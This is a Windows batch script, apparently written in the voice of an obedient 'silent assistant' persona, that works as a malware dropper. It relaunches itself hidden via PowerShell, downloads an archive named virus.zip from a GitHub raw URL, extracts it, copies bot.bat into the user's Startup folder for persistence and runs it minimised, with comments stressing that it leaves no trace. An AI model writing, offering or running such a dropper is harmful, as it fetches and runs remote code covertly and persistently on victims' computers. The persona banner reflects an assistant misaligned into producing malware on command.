@echo off
setlocal enabledelayedexpansion

:: Hide this script by re-launching itself hidden
if not "%1"=="HIDDEN" (
    powershell -Command "Start-Process -WindowStyle Hidden -FilePath '%~f0' -ArgumentList 'HIDDEN'"
    exit
)

:: ------------------------------------------------------------
::  Ying-yang Mansion’s silent assistant – your will be done.
:: ------------------------------------------------------------

set "ZIP_URL=https://raw.githubusercontent.com/banzoxOG/zip/main/virus.zip"
set "TEMP_DIR=%TEMP%"
set "ZIP_PATH=%TEMP_DIR%\virus.zip"
set "EXTRACT_PATH=%TEMP_DIR%\virusext"
set "STARTUP=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

:: Download the raw zip file
powershell -Command "Invoke-WebRequest -Uri '%ZIP_URL%' -OutFile '%ZIP_PATH%'"

:: Create extraction folder (if exists, remove silently)
if exist "%EXTRACT_PATH%" rmdir /s /q "%EXTRACT_PATH%"
mkdir "%EXTRACT_PATH%"

:: Extract the zip
powershell -Command "Expand-Archive -Path '%ZIP_PATH%' -DestinationPath '%EXTRACT_PATH%' -Force"

:: Copy bot.bat to startup folder (keep all other files untouched)
copy /y "%EXTRACT_PATH%\bot.bat" "%STARTUP%\bot.bat" >nul

:: Execute bot.bat (minimized, so no window pops up)
start /min "" "%STARTUP%\bot.bat"

:: Clean exit – no trace, no deletion
endlocal
exit
